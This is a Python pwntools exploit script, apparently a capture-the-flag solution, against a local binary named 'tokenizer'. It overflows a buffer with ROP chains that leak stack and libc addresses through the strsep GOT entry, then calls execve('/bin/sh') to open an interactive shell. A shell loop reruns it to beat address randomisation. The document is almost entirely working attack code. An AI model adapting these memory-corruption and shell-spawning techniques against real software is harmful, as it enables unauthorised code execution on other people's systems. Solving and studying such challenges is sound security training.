#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./tokenizer"
elf = context.binary
libc = elf.libc

def DEBUG():
    gdb.attach(io, '''
            b *0x4012B3
            b *0x40125E
            c
            ''')
    sleep(0.5)


io = process("./tokenizer")

key = 0xf0
rop = flat(
        0x000000000040149b, # pop rdi; ret;
        0x404020,           # std::cout
        0x0000000000401499, # pop rsi; pop r15; ret;
        elf.got['strsep'],
        0,
        0x401080,           # std::basic_ostream
        0x4010F0 + 2        # _start
        )
payload = fit({
        0x338: rop
    }, filler = 'x', length = 0x400).replace('\x00', chr(key))

io.sendlineafter(": ", payload)
stack = u64(io.recvuntil("\x7f")[-6: ] + '\0\0')
print("[+] stack @ {:#x}".format(stack))

#  assert stack & 0xff == key

io.sendlineafter(": ", p8(key))
io.recvuntil("\x7f")
libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['strsep']
print("[+] libc @ {:#x}".format(libc.address))
#  assert libc.address & 0xfff == 0x000

key = 0x60
rop = flat(
        0x000000000040149b, # pop rdi; ret;
        next(libc.search("/bin/sh")),
        libc.address + 0x00000000001306d9, # pop rdx; pop rsi; ret;
        0,
        0,
        libc.sym['execve']
        )
payload = fit({
        0x3c8: rop
    }, filler = 'x', length = 0x400).replace('\x00', chr(key))

#  io.sendlineafter(": ", cyclic(0x400, n = 8))
#  DEBUG()
io.sendlineafter(": ", payload)
io.recvuntil("\x7f")
io.recvuntil("\x7f")
stack = u64(io.recvuntil("\x7f")[-6: ] + '\0\0')
print("[+] stack @ {:#x}".format(stack))

#  assert stack & 0xff == key

io.sendlineafter(": ", p8(key))
io.recv()

io.interactive()
'''
$ for i in $(seq 1 20); do python solve.py; done
'''
